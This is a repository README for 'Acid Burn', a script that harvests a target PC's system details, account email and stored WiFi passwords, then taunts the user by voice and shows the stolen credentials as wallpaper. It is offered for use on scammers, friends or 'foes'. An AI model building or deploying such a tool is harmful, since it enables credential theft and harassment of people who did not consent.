# Acid Burn

A script I put together to torment Call Center Scammers but can be used on your friends as well...or foes.

## Description

This program enumerates a target PC to include Operating System, RAM Capacity, Public IP, and Email associated with the Microsoft account.
The SSID and WiFi password of any current or previously connected to networks.
It determines the last day they changed their password and how many days ago.
Once the information is gathered, the script will pause until a mouse movement is detected.
Then, the script uses Sapi speak to roast their set up and lack of security.
If wifi networks and passwords are detected, the wallpaper will be changed to an image displaying that information.
The generated image will be saved to the desktop and steganography is used to put a hidden message at the bottom of the binary output of the generated image.
